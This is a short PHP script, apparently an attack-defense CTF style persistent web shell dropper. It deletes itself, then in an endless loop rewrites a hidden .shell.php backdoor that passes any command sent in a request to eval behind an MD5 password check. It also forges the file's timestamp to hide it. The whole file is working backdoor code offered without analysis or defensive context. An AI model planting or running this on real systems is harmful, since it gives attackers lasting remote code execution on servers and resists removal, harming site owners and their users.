<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.shell.php';
$code = '<?php if(md5($_GET["passwd"])=="76a2173be6393254e72ffa4d6df1030a"){@eval($_REQUEST['cmd']);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .shell.php');
    usleep(5000);
}
?>